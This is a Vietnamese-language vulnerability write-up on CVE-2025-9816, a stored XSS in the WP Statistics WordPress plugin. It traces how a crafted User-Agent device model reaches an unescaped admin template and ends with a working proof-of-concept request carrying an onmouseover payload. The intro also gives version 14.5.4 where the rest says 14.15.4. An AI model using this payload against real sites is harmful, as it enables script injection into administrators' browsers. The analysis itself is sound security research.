# CVE-2025-9816 Analysis & POC


<!--more-->

## CVE & Basic Info

**WP Statistics – The Most Popular Privacy-Friendly Analytics Plugin** cho WordPress mắc lỗ hổng **Stored Cross-Site Scripting (XSS)** qua **User-Agent Header** trong tất cả các phiên bản từ trước đến **14.5.4** (bao gồm cả 14.5.4). Nguyên nhân xuất phát từ việc **kiểm tra và lọc dữ liệu đầu vào** cũng như **thoát dữ liệu đầu ra** chưa đầy đủ.

Lỗ hổng này cho phép **kẻ tấn công không cần xác thực** chèn các đoạn mã JavaScript độc hại vào hệ thống. Các đoạn mã này sẽ được thực thi mỗi khi người dùng truy cập vào trang có chứa dữ liệu đã bị chèn mã độc, gây ra nguy cơ nghiêm trọng cho bảo mật và quyền riêng tư.

* **CVE ID**: [CVE-2025-9816](https://www.cve.org/CVERecord?id=CVE-2025-9816)
* **Vulnerability Type**: Cross Site Scripting (XSS)
* **Affected Versions**: <= 14.15.4
* **Patched Versions**: 14.15.5
* **CVSS severity**: Medium (7.1)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress WP Statistics Plugin](https://wordpress.org/plugins/wp-statistics/)

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **WP Statistics**: **v14.15.4** (vulnerable) và **v14.15.5** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

Tôi đã thiếu sót trong quá trình thu thập thông tin về CVE này, [references](https://plugins.trac.wordpress.org/browser/wp-statistics/tags/14.15.3/includes/admin/templates/pages/devices/models.php#L31) của [https://www.cve.org/CVERecord?id=CVE-2025-9816](https://www.cve.org/CVERecord?id=CVE-2025-9816) chỉ rõ nơi lỗ hỗng xảy ra: `includes/admin/templates/pages/devices/models.php`{: .filepath}

Nhưng tôi đã bỏ qua nó và sử dụng [**Meld**](https://meldmerge.org/) để so sánh code. Do code thay đổi khá nhiều nên tôi đã chủ động tìm các file liên quan đến **user-agent**

{{< figure src="dif1.png" caption="Diff — so sánh thay đổi mã giữa bản vulnerable và bản vá" >}}

Và code thay đổi trong `UserAgent.php`{: .filepath} làm tôi tin rằng lỗ hỗng thực sự xảy ra ở đây.

{{< figure src="dif2.png" caption="Diff — Sự thay đổi mã trong UserAgent.php" >}}

Nó làm tôi tốn khá nhiều thời gian nhưng chưa thể phân tích được. Tuy nhiên, việc này cũng giúp ích cho quá trình phân tích.

🍀 May mắn thay, dưới sự hướng dẫn của các tiền bối, tôi đã **focus** vào đúng vào [**vị trí lỗ hổng**](https://plugins.trac.wordpress.org/browser/wp-statistics/tags/14.15.3/includes/admin/templates/pages/devices/models.php#L31). Nên quá trình phân tích trở nên dễ dàng hơn.

> Tip: Đây là lỗ hổng Cross Site Script diễn ra ở trình duyệt của nạn nhân nên ta cần tìm nơi render và trả về HTML.

### Patch diff

Lỗ hổng xảy ra trong file `includes/admin/templates/pages/devices/models.php`{: .filepath} tại dòng 31.

Trong phiên bản **vulnerable**, `$item->model` được in ra HTML nhưng **không có cơ chế bảo vệ nào**

```html
<span title="<?php echo \WP_STATISTICS\Admin_Template::unknownToNotSet($item->model); ?>" class="wps-model-name">
    <?php echo self::isUnknown($item->model) ? esc_html__('Unknown', 'wp-statistics') : $item->model; ?>
</span>
```

Trong phiên bản **patched**, `$item->model` đã được bảo vệ bằng cách đặt nó vào `esc_attr()` và `esc_html()`.

```html
<span title="<?php echo esc_attr(\WP_STATISTICS\Admin_Template::unknownToNotSet($item->model)); ?>" class="wps-model-name">
    <?php echo self::isUnknown($item->model) ? esc_html__('Unknown', 'wp-statistics') : esc_html($item->model); ?>
</span>
```

👉 Bản vá bổ sung lớp lọc đầu vào cho `$item->model`, đảm bảo nó sẽ được **escape** trước khi in ra HTML.

{{< figure src="dif3.png" caption="Diff — Sự thay đổi mã trong models.php" >}}

### Vulnerable code

```html
<?php
use WP_STATISTICS\Helper;
?>

<div class="postbox-container wps-postbox-full">
  <?php if (!empty($data['visitors'])) : ?>
      <div class="o-table-wrapper">
          <table width="100%" class="o-table wps-new-table">
              <thead>
              </thead>
              <tbody>
                  <?php foreach ($data['visitors'] as $item) : ?>
                      <tr>
                          <td class="wps-pd-l">
                              <span title="<?php echo \WP_STATISTICS\Admin_Template::unknownToNotSet($item->model); ?>" class="wps-model-name">
                                  <?php echo self::isUnknown($item->model) ? esc_html__('Unknown', 'wp-statistics') : $item->model; ?>
                              </span>
                          </td>
                      </tr>
                  <?php endforeach; ?>
              </tbody>
          </table>
      </div>
  <?php else : ?>
      <div class="o-wrap o-wrap--no-data wps-center">
          <?php esc_html_e('No recent data available.', 'wp-statistics'); ?>
      </div>
  <?php endif; ?>
</div>
```

Nếu `$data` không rỗng thì duyệt qua `$data` và hiển thị dữ liệu đã thống kê của **visitors**, bao gồm `model`.
Nếu rỗng thì in ra `No recent data available.`

```php
public static function isUnknown($value)
{
    if (empty($value) or $value == 'Unknown' or $value == __("Unknown", 'wp-statistics')) {
        return true;
    }

    return false;
}

public static function unknownToNotSet($value)
{
    if (self::isUnknown($value)) {
        return __('(not set)', 'wp-statistics');
    }
    return $value;
}
```

`unknownToNotSet()` sẽ trả về `(not set)` nếu `$item->model` rỗng, `Unknown`, `Unknown` theo từng ngôn ngữ.

`__("Unknown", 'wp-statistics')` sẽ tìm bản dịch của `Unknown` trong file dịch `.po`/`.mo` của text domain `wp-statistics`

👉 Không có cơ chế bảo vệ `$item->model`

`$data` không được khởi tạo trong file này nên chắc chắn rắng nó được khởi tạo từ nơi khác và `models.php`{: .filepath} sẽ sử dụng nó khi được include.
Ta có thể search bằng từ khóa `models.php` để tìm đến nơi gọi đến nó, nhưng ở đây nó được **include** động. Thay vào đó, ta search với tên thư mục chứa nó `pages/devices`.

{{< figure src="search1.png" caption="Diff — Cách các template được gọi động" >}}

👉 `models.php`{: .filepath} sẽ được gọi động trong hàm `render()` của class `TabsView`

```php
class TabsView extends BaseTabView
{
    public function render()
    {
        $currentTab  = $this->getCurrentTab();
        $data        = $this->getTabData();

        $args = [
            'title'           => esc_html__('Devices', 'wp-statistics'),
            'pageName'        => Menus::get_page_slug('devices'),
            'paged'           => Admin_Template::getCurrentPaged(),
            'custom_get'      => ['tab' => $currentTab],
            'data'            => $data,
            'viewMoreUrlArgs' => ['type' => 'single-' . rtrim($currentTab, 's'), 'from' => Request::get('from'), 'to' => Request::get('to')],
            'tabs'            => [
                [
                    'link'        => Menus::admin_url('devices', ['tab' => 'overview']),
                    'title'       => esc_html__('Overview', 'wp-statistics'),
                ],
                [
                    'link'        => Menus::admin_url('devices', ['tab' => 'browsers']),
                    'title'       => esc_html__('Browsers', 'wp-statistics'),
                ],
                [
                    'link'        => Menus::admin_url('devices', ['tab' => 'platforms']),
                    'title'       => esc_html__('Operating Systems', 'wp-statistics'),
                ],
                [
                    'link'        => Menus::admin_url('devices', ['tab' => 'models']),
                    'title'       => esc_html__('Device Models', 'wp-statistics'),
                ],
                [
                    'link'        => Menus::admin_url('devices', ['tab' => 'categories']),
                    'title'       => esc_html__('Device Categories', 'wp-statistics'),
                ]
            ],
        ];

        Admin_Template::get_template(['layout/header', 'layout/tabbed-page-header', "pages/devices/$currentTab", 'layout/postbox.hide', 'layout/footer'], $args);
    }
}
```

Có sự tương quan giữa các giá trị trong `$args` và submenu **Devices**

{{< figure src="submenu.png" caption="Diff — Sự tương quan giữa các giá trị trong $args và submenu Devices" >}}

Giá trị `tab` trong `args` sẽ tương ứng với param `tab` trên URL => Phạm vi truy vết nằm trong submenu **Devices** của admin panel. Ta cần xác định `$currentTab` để biết cách `render()` gọi đến `models.php`{: .filepath} và `$data` để inject payload.

**Biến $currentTab**

```php
// $currentTab  = $this->getCurrentTab();
protected function getCurrentTab()
{
    return Request::get('tab', $this->defaultTab);
}
```

`getCurrentTab()` trả về giá trị của `Request::get()`

```php
// $param='tab'
public static function get($param, $default = false, $return = 'string')
{
    if (empty($_REQUEST[$param])) return $default;

    $value = $_REQUEST[$param];

    if ($return === 'string') {
        return sanitize_text_field($value);
    }

    if ($return === 'url') {
        return sanitize_url($value);
    }

    if ($return === 'number') {
        return intval($value);
    }

    if ($return === 'text') {
        return sanitize_textarea_field($value);
    }

    if ($return === 'bool') {
        return boolval($value);
    }

    if ($return === 'array' && is_array($value)) {
        return array_map('sanitize_text_field', $value);
    }

    return $value;
}
```

👉 `get()` trả về giá trị của param `'tab'` được lấy từ `$_REQUEST['tab']`, ví dụ:

```
wp-admin/admin.php?page=wps_devices_page&tab=models <-- $value=models
```

👉 `$currentTab` là giá trị của param `tab`

**Biến $data**

```php
// $data = $this->getTabData();
protected function getTabData()
{
    $currentTab     = ucwords($this->getCurrentTab(), '-');
    $tabDataMethod  = 'get' . str_replace('-', '', $currentTab) . 'Data'; // getModelsData

    if (!method_exists($this, $tabDataMethod)) {
        // Filter to add data for locked tab
        return apply_filters("wp_statistics_{$this->getCurrentPage()}_{$this->getCurrentTab()}_data", []);
    };

    return $this->$tabDataMethod();
}
```

Hàm `getTabData()` được định nghĩa trong abstract class `BaseTabView`, được class `TabsView` kế thừa nên `$data = $this->getTabData();` là cách `TabsView` gọi hàm thừa hưởng từ `BaseTabView`

Ta đang focus vào **model** nên tab ở đây là `models`, `$tabDataMethod` sẽ có giá trị `'getModelsData'`

Nếu `getModelsData()` không tồn tại thì filter hook `wp_statistics_wps_devices_page_models_data` được áp dụng. Nhưng ở đây `getModelsData()` được định nghĩa trong class `TabsView`, `$this` cũng chính là `TabsView` nên `getModelsData()` của `TabsView` được gọi.

```php
public function __construct()
{
    parent::__construct();

    $this->dataProvider = new DevicesDataProvider([
        'per_page' => 10,
        'page'     => Admin_Template::getCurrentPaged()
    ]);
}

public function getModelsData()
{
    return $this->dataProvider->getModelsData();
}
```

`getModelsData()` trả về kết quả của `getModelsData()` trong class `DevicesDataProvider`.

```php
public function __construct($args)
{
    $this->args = $args;

    $this->visitorsModel = new VisitorsModel();
}

public function getModelsData()
{
    $args = array_merge($this->args, [
        'field'    => 'model',
        'group_by' => ['model']
    ]);

    $visitors = $this->visitorsModel->getVisitorsDevices($args);

    if (! empty($visitors)) {
        $visitors = array_reduce($visitors, function ($carry, $item) {
            // Trim whitespace and default empty models to 'Unknown'
            $model = trim($item->model ?? '');

            if ($model === '') {
                $model = 'Unknown';
            }

            if (isset($carry[$model])) {
                $carry[$model]->visitors += $item->visitors;
            } else {
                $carry[$model] = (object)[
                    'model'    => $model,
                    'visitors' => $item->visitors
                ];
            }
            return $carry;
        }, []);
    }

    return [
        'visitors' => $visitors,
        'total'    => $this->visitorsModel->countColumnDistinct($args),
        'visits'   => $this->visitorsModel->countColumnDistinct(array_merge($args, ['field' => 'ID'])),
    ];
}
```

Ta focus vào `$visitors` vì nó được lặp và hiển thị ra HTML trong `models.php`{: .filepath}

```php
<?php foreach ($data['visitors'] as $item) : ?>
```

`$visitors` là kết quả trả về của hàm `getVisitorsDevices()` thuộc class `VisitorsModel`

```php
public function getVisitorsDevices($args = [])
{
    $args = $this->parseArgs($args, [
        'field'          => 'agent',
        'date'           => '',
        'where_not_null' => '',
        'group_by'       => [],
        'order_by'       => 'visitors',
        'order'          => 'DESC',
        'per_page'       => '',
        'page'           => 1,
    ]);

    $result = Query::select([
        $args['field'],
        'COUNT(visitor.ID) AS `visitors`',
    ])
        ->from('visitor')
        ->whereDate('last_counter', $args['date'])
        ->whereNotNull($args['where_not_null'])
        ->groupBy($args['group_by'])
        ->orderBy($args['order_by'], $args['order'])
        ->perPage($args['page'], $args['per_page'])
        ->getAll();

    return $result ? $result : [];
}
```

`getVisitorsDevices()` truy vấn `from('visitor')` cụ thể là bảng `wp_statistics_visitor` trong database rồi trả về kết quả.

```sql
mysql> show tables;
+-------------------------------------+
| Tables_in_wordpress                 |
+-------------------------------------+          
| wp_statistics_visitor               |
| wp_other_table                      |
| wp_users                            |
+-------------------------------------+
```

Bảng `wp_statistics_visitor` bao gồm các trường sau:

```sql
mysql> desc wp_statistics_visitor;
+----------------+-----------------+------+-----+---------+----------------+
| Field          | Type            | Null | Key | Default | Extra          |
+----------------+-----------------+------+-----+---------+----------------+
| ID             | bigint          | NO   | PRI | NULL    | auto_increment |
| last_counter   | date            | NO   | MUL | NULL    |                |
| referred       | text            | NO   |     | NULL    |                |
| agent          | varchar(180)    | NO   | MUL | NULL    |                |
| platform       | varchar(180)    | YES  | MUL | NULL    |                |
| version        | varchar(180)    | YES  | MUL | NULL    |                |
| device         | varchar(180)    | YES  | MUL | NULL    |                |
| model          | varchar(180)    | YES  | MUL | NULL    |                |
| UAString       | varchar(190)    | YES  |     | NULL    |                |
| ip             | varchar(60)     | NO   | MUL | NULL    |                |
| location       | varchar(10)     | YES  | MUL | NULL    |                |
| user_id        | bigint          | NO   |     | NULL    |                |
| hits           | int             | YES  |     | NULL    |                |
| honeypot       | int             | YES  |     | NULL    |                |
| city           | varchar(100)    | YES  |     | NULL    |                |
| region         | varchar(100)    | YES  |     | NULL    |                |
| continent      | varchar(50)     | YES  |     | NULL    |                |
| source_channel | varchar(50)     | YES  |     | NULL    |                |
| source_name    | varchar(100)    | YES  |     | NULL    |                |
| first_page     | bigint unsigned | YES  |     | NULL    |                |
| first_view     | datetime        | YES  |     | NULL    |                |
| last_page      | bigint unsigned | YES  |     | NULL    |                |
| last_view      | datetime        | YES  |     | NULL    |                |
+----------------+-----------------+------+-----+---------+----------------+
```

👉 Như vậy, `$data` là chứa kết quả trả về của truy vấn đến bảng `wp_statistics_visitor`(chứa **model** của **visitor**) và một số giá trị khác.
Ta cần tìm cách để lưu **XSS payload** vào trường **model** của `wp_statistics_visitor`.

May mắn thay, trong lúc chật vật với vị trí sink không chính xác lúc ban đầu, tôi đã tìm ra cách plugin lưu trữ thông tin của **visitor** vào `wp_statistics_visitor`.

```php
register_rest_route('wp-statistics/v2', '/' . 'hit', array(
    array(
        'methods'             => \WP_REST_Server::CREATABLE,
        'callback'            => array($this, 'hit_callback'),
        'args'                => self::require_params_hit(),
        'permission_callback' => function (\WP_REST_Request $request) {
            return $this->checkSignature($request);
        }
    )
));
```

Plugin đã đăng ký một **REST API** với endpoint `/wp-json/wp-statistics/v2/hit`, nhận `hit_callback()` làm callback.
Nhưng để sử dụng được endpoint này, cần phải vượt qua `checkSignature`

```php
protected function checkSignature($request)
{
    if (Helper::isRequestSignatureEnabled()) {
        $signature = $request->get_param('signature');
        $payload   = [
            $request->get_param('source_type'),
            (int)$request->get_param('source_id'),
        ];

        if (!Signature::check($payload, $signature)) {
            return new \WP_Error('rest_forbidden', __('Invalid signature', 'wp-statistics'), array('status' => 403));
        }
    }

    return true;
}
```

Các param này sẽ tự động cung cấp khi ta truy cập trang web => luôn true.
Khi bắt request bằng **BurpSuite** ta sẽ thấy rõ điều đó

```http
POST /wp-json/wp-statistics/v2/hit HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; model_here) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36

wp_statistics_hit=1&source_type=home&source_id=0&search_query=&signature=787b07b8979cb982ec89a4f103a68081&endpoint=hit&referred=&page_uri=Lw%3D%3D
```

Như vậy, ta không ần quan tâm đến `permission_callback`.

Quay trở lại với `hit_callback()`, hàm chính xử lý việc lưu trữ thông tin **visitor**.

```php
public function hit_callback()
{
    $statusCode = false;

    try {
        Helper::validateHitRequest();
        Hits::record();

        $responseData['status'] = true;

    } catch (Exception $e) {
        $responseData['status'] = false;
        $responseData['data']   = $e->getMessage();
        $statusCode             = $e->getCode();
    }

    $response = rest_ensure_response($responseData);

    if ($statusCode) {
        $response->set_status($statusCode);
    }

    $response->set_headers(array(
        'Cache-Control' => 'no-cache',
    ));

    return $response;
}
```

Lỗi liên quan đến user-agent header và model đặt trong nó, ta cần focus, tìm cách để thêm model vào database. [Đây](https://51degrees.com/blog/understanding-user-agent-string#Unpacking%20the%20User%20Agent%20string) là cú pháp của user-agent có model.

```php
// Helper::validateHitRequest();
public static function validateHitRequest()
{
    $isValid = Request::validate([
        'page_uri'     => [
            'required'        => true,
            'nullable'        => true,
            'type'            => 'string',
            'encoding'        => 'base64',
            'invalid_pattern' => self::injectionPatterns()
        ],
        'search_query' => [
            'required'        => true,
            'nullable'        => true,
            'type'            => 'string',
            'encoding'        => 'base64',
            'invalid_pattern' => self::injectionPatterns()
        ],
        'source_id'    => [
            'type'     => 'number',
            'required' => true,
            'nullable' => false
        ],
        'referred'     => [
            'required' => true,
            'nullable' => true,
            'type'     => 'url',
            'encoding' => 'base64'
        ],
    ]);

    if (!$isValid) {
        do_action('wp_statistics_invalid_hit_request', $isValid, IP::getIP());
        throw new ErrorException(esc_html__('Invalid hit/online request.', 'wp-statistics'));
    }

    return true;
}
```

`validateHitRequest()` là hàm dùng để validate các params được truyền vào body của request đến `hit` ở trên, các param này được plugin cung cấp nên chỉ cần tái sử dụng lại nó => không ảnh hưởng gì đến model trong user-agent header.

```php
// Hits::record();
public static function record($visitorProfile = null)
{
    if (!$visitorProfile) {
        $visitorProfile = new VisitorProfile();
    }

    /**
        * Record Pages
        */
    $pageId = false;
    if (Pages::active()) {
        $pageId = Pages::record($visitorProfile);
    }

    /**
        * Record Visitor Detail
        */
    $visitorId = false;
    if (Visitor::active()) {
        $visitorId = Visitor::record($visitorProfile, ['page_id' => $pageId]);
    }

    // other logic
}
```

Từ khóa `record` làm tôi liên tưởng đến việc quay video màn hình và lưu trữ nó vào bộ nhớ. Tương tự, trong trường hợp này sẽ lưu trữ thông tin visitor vào database.

Nếu `visitor=null` tức chưa tồn tại thì gọi đến `Visitor::active()` để kiểm tra và thực hiện `record()` của **Visitor**

```php
public static function active()
{
    return (has_filter('wp_statistics_active_visitors')) ? apply_filters('wp_statistics_active_visitors', true) : true;
}
```

Hàm `active()` sẽ trả về **true mặc định**.

* Nếu trong plugin đã `add_filter('wp_statistics_active_visitors', 'my_function')`, thì giá trị trả về sẽ được thay đổi theo kết quả của filter.
* Nếu không có filter nào, thì nó chỉ trả về **true**.

Search với hook name `wp_statistics_active_visitors` ta không thấy filter nào được add cả

{{< figure src="search2.png" caption="Kết quả tìm kiếm hook name wp_statistics_active_visitors" >}}

👉 `active()` luôn true => `Visitor::record()` được gọi.

```php
 public static function record($visitorProfile, $arg = array())
{
    global $wpdb;

    // Define the array of defaults
    $defaults = array(
        'location'         => '',
        'exclusion_match'  => false,
        'exclusion_reason' => '',
        'page_id'          => 0
    );

    $userAgent    = $visitorProfile->getUserAgent(); <-- focus
    $same_visitor = $visitorProfile->isIpActiveToday();

    // If we have a new Visitor in Day
    if (!$same_visitor) {

        // Prepare Visitor information
        $visitor = array(
            'agent'          => $userAgent->getBrowser(),
            'platform'       => $userAgent->getPlatform(),
            'version'        => $userAgent->getVersion(),
            'device'         => $userAgent->getDevice(),
            'model'          => $userAgent->getModel(), <-- focus
            // other logic
        );

        $visitor = apply_filters('wp_statistics_visitor_information', $visitor);

        //Save Visitor TO DB
        $visitor_id = self::save_visitor($visitor, $visitorProfile);

    } else {
    }
}
```

Plugin lấy user-agent từ http request và gán vào `$userAgent`

{{< figure src="debug1.png" caption="Debug cho $userAgent" >}}

Sau đó gán vào mảng `$visitor` và lưu thông tin **visitor** vào database bằng hàm `save_visitor()`. Ta cần focus vào dòng code chứa model:

```php
'model' => $userAgent->getModel()
```

`'model'` là giá trị trả về của `getModel()`

```php
public function getModel()
{
    $model = '';

    if (! empty($this->deviceDetector)) {
        $brand  = $this->deviceDetector->getBrandName();
        $device = $this->deviceDetector->getModel();

        if (!empty($device)) {
            $words = explode(' ', trim($device));
            $device = $words[0] ?? null;

            if (! empty($device) && ctype_digit($device)) {
                $device = '';
            }
        }

        $model = trim($brand . ' ' . $device);
    }      

    return $model ?? null;
}
```

Các logic trong `getModel()` liên quan đến `deviceDetector` được khởi tạo trong `__construct`, ta cần tìm hiểu nó là gì:

```php
class UserAgentService
{
    public function __construct()
    {
        try {
            // Get HTTP User Agent
            $userAgent = UserAgent::getHttpUserAgent();

            // Initialize DeviceDetector with the user agent string
            $this->deviceDetector = new \WP_Statistics\Dependencies\DeviceDetector\DeviceDetector($userAgent);
            $this->deviceDetector->parse();

        } catch (Exception $e) {
            // In case of an error, set deviceDetector to null
            $this->deviceDetector = null;
        }
    }
}
```

`deviceDetector` là một thể hiển của class `DeviceDetector`, khởi tạo với tham số `$userAgent` là user-agent được lấy từ HTTP request.

{{< figure src="debug2.png" caption="Debug cho $userAgent" >}}

```php
class DeviceDetector 
{
    public function __construct(string $userAgent = '', ?ClientHints $clientHints = null)
    {
        if ('' !== $userAgent) {
            $this->setUserAgent($userAgent);
        }

        if ($clientHints instanceof ClientHints) {
            $this->setClientHints($clientHints);
        }

        $this->addClientParser(new FeedReader());
        $this->addClientParser(new MobileApp());
        $this->addClientParser(new MediaPlayer());
        $this->addClientParser(new PIM());
        $this->addClientParser(new Browser());
        $this->addClientParser(new Library());

        $this->addDeviceParser(new HbbTv());
        $this->addDeviceParser(new ShellTv());
        $this->addDeviceParser(new Notebook());
        $this->addDeviceParser(new Console());
        $this->addDeviceParser(new CarBrowser());
        $this->addDeviceParser(new Camera());
        $this->addDeviceParser(new PortableMediaPlayer());
        $this->addDeviceParser(new Mobile());

        $this->addBotParser(new Bot());
    }
}
```

`DeviceDetector` set user-agent và thêm **parser** cho từng loại **device/app**, các parser này có thể liên quan đến `$this->deviceDetector->parse();` được gọi ở trên.

Ta tìm hiểu thử đối số `new Mobile()`

```php
class Mobile extends AbstractDeviceParser
{
    /**
     * @var string
     */
    protected $fixtureFile = 'regexes/device/mobiles.yml';

    /**
     * @var string
     */
    protected $parserName = 'mobile';
}
```

`$fixtureFile` trong `Mobile` là đường dẫn đến file chứa các regex, để hiểu rõ hơn, ta nhấn tổ hợp phím <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>P</kbd> và search với `regexes/device/mobiles.yml`

{{< figure src="search3.png" caption="Tìm kiếm file regexes/device/mobiles.yml" >}}
*Tìm kiếm file regexes/device/mobiles.yml*

Nội dung file `mobile.yml`{: .filepath}:

```yml
# Gol Mobile (gol-mobile.com)
Gol Mobile:
  regex: '(?:F10_PRIME|F3Prime|F9_PLUS|TEAM_7_3G)(?:[);/ ]|$)'
  device: 'smartphone'
  models:
    - regex: 'F10_PRIME'
      model: 'F10 Prime'
    - regex: 'F3Prime'
      model: 'F3 Prime'
    - regex: 'F9_PLUS'
      model: 'F9 Plus'
    - regex: 'TEAM_7_3G'
      device: 'tablet'
      model: 'Team 7.0 3G'

# Goly: 
Goly:
  regex: 'Goly[ _-]'      # match khi UA có "Goly-" hoặc "Goly_" hoặc "Goly "
  device: 'smartphone'    # loại thiết bị
  models:
    - regex: 'Goly[ _-]([^;/]+) Build'   # lấy model trước "Build"
      model: '$1'
    - regex: 'Goly[ _-]([^;/)]+)(?:[;/)]|$)'  # lấy model trước ; / ) hoặc hết chuỗi
      model: '$1'

# other model
```

`mobile.yml`{: .filepath} chứa các regex để nhận diện thiết bị mobile, lấy model của nó.

Sau khi `DeviceDetector` được khởi tạo trong `__construct` của class `UserAgentService` thì `parse()` được gọi để phân tích cú pháp của user-agent.

```php
public function parse(): void
{
    if ($this->isParsed()) {
        return;
    }

    $this->parsed = true;

    // skip parsing for empty useragents or those not containing any letter (if no client hints were provided)
    if ((empty($this->userAgent) || !\preg_match('/([a-z])/i', $this->userAgent))
        && empty($this->clientHints)
    ) {
        return;
    }
    // other parse

    $this->parseDevice();
}
```

Nếu chưa được `parse (user-agent mới)` thì thực hiện parse bằng hàm `parseDevice()`.

```php
protected function parseDevice(): void
{
    $parsers = $this->getDeviceParsers();

    foreach ($parsers as $parser) {
        $parser->setYamlParser($this->getYamlParser());
        $parser->setCache($this->getCache());
        $parser->setUserAgent($this->getUserAgent());
        $parser->setClientHints($this->getClientHints());

        if ($parser->parse()) {
            $this->device = $parser->getDeviceType();
            $this->model  = $parser->getModel();
            $this->brand  = $parser->getBrand();

            break;
        }
    }
    // other logic
}
```

`parseDevice()` lấy các parser đã được khởi tạo trong `__construct` và gán vào `$parsers`

{{< figure src="debug3.png" caption="Debug tab cho biến $parsers" >}}

Sau đó duyệt qua `$parsers`, set cấu hình bao gồm các regex trong file `.yml`, nếu regex khớp tức parse thành công, gán model, device, brand cho `DeviceDetector`

{{< figure src="debug4.png" caption="Debug tab gán giá trị cho các tham số của DeviceDetector" >}}

{{< figure src="debug5.png" caption="Debug tab giá trị của model" >}}

Như vậy ta đã biết được cách kiểm soát model trước khi gán nó vào `$visitor` và thêm vào database.

{{< figure src="debug6.png" caption="Debug tab giá trị của model trong $visitor" >}}

Kiểm tra **database**:

```sql
mysql> SELECT ID, last_counter, referred, agent, platform, version, device, model FROM wp_statistics_visitor;
+----+--------------+----------+---------------+----------+---------+------------+--------------+
| ID | last_counter | referred | agent         | platform | version | device     | model        |
+----+--------------+----------+---------------+----------+---------+------------+--------------+
| 63 | 2025-10-01   |          | Chrome Mobile | Android  | 93      | smartphone | Google Pixel |
| 64 | 2025-10-01   |          | Chrome Mobile | Android  | 93      | smartphone | Goly payload |
+----+--------------+----------+---------------+----------+---------+------------+--------------+
```

Kiểm tra trong **UI tab models**:

{{< figure src="ui1.png" caption="Model được hiển thị trong UI tab models" >}}

### Sources & Sinks

**Source:** `User-Agent` header (POST `/wp-json/wp-statistics/v2/hit`) — DeviceDetector parse → `getModel()`.
**Sink:** `includes/admin/templates/pages/devices/models.php` — `echo $item->model` (không `esc_html()` / `esc_attr()`)

### Flow

1. Attacker gửi UA chứa payload XSS trong model
2. Model chứa payload được lưu trong database
3. Admin mở tab models => payload chạy.

## Exploit

### Proof of Concept (PoC)

* Gửi request chứa XSS payload:

```http
POST /wp-json/wp-statistics/v2/hit HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Linux; Android 14; Goly "onmouseover=alert()-" Build) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36

wp_statistics_hit=1&source_type=home&source_id=0&search_query=&signature=787b07b8979cb982ec89a4f103a68081&endpoint=hit&referred=&page_uri=Lw%3D%3D
```

* Admin truy cập endpoint và hover vào model chứa payload:

```
http://localhost/wp-admin/admin.php?page=wps_devices_page&tab=models
```

{{< figure src="result.png" caption="Result — PoC execution screenshot" >}}

> Dùng `"` để đóng title, tạo alert() thông qua sự kiện **onmouseover** vì đây là thẻ `<span>`, `-` đùng để nối chuỗi trong JavaScript tránh được lỗi cú pháp

## Conclusion

Lỗ hổng **CVE-2025-9816** trong plugin **WP Statistics <= 14.15.4** cho phép **Stored XSS** thông qua giá trị `model` lấy từ header `User-Agent`. Payload được lưu vào DB và hiển thị trong trang quản trị **Device Models** mà không escape đúng cách. Bản vá **14.15.5** đã thêm `esc_html()`/`esc_attr()` khi in ra HTML.

**Key takeaways**:

* **Stored XSS** nguy hiểm hơn reflected vì tồn tại lâu dài trong DB.
* Dữ liệu đến từ **HTTP headers** cũng cần được coi như input không tin cậy.
* Luôn **escape khi output** thay vì chỉ sanitize khi input.
* **Update plugin** lên bản mới nhất để ngăn chặn khai thác.

## References

[Cross-site scripting (XSS) cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[WordPress WP Statistics <= 14.15.4 - CVE-2025-9816](https://patchstack.com/database/wordpress/plugin/wp-statistics/vulnerability/wordpress-wp-statistics-plugin-14-5-4-unauthenticated-stored-cross-site-scripting-via-user-agent-header-vulnerability)


---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/  

